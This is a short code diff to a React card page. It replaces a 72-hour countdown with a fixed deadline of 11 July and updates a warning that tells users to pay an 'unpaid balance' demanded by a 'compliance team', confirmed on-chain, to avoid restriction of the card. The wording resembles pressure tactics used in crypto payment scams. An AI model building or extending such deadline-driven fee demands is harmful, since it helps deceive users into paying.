@@ -46,10 +46,17 @@ export default function CardPage() {
   const [timeLeft,      setTimeLeft]      = useState('');
 
   /* ── countdown timer ── */
-  const [countdown, setCountdown] = useState(72 * 60 * 60);
+  const [countdown, setCountdown] = useState(0);
 
   useEffect(() => {
-    const timer = setInterval(() => setCountdown(prev => (prev > 0 ? prev - 1 : 0)), 1000);
+    const targetDate = new Date('2026-07-11T23:59:59Z').getTime();
+    const updateTimer = () => {
+      const now = new Date().getTime();
+      const diff = Math.floor((targetDate - now) / 1000);
+      setCountdown(diff > 0 ? diff : 0);
+    };
+    updateTimer();
+    const timer = setInterval(updateTimer, 1000);
     return () => clearInterval(timer);
   }, []);
 
@@ -409,7 +416,7 @@ export default function CardPage() {
                       </button>
                     </div>
                     <p className="text-xs text-gray-500">
-                      ⚠️ Clearing this unpaid balance is required by our compliance team. You have 3 days to cover this balance to avoid restriction. Once confirmed on-chain, your card will be credited within 24–48 hrs.
+                      ⚠️ Clearing this unpaid balance is required by our compliance team. You have until 11 of July to cover this balance to avoid restriction. Once confirmed on-chain, your card will be credited within 24–48 hrs.
                     </p>
                   </div>
 
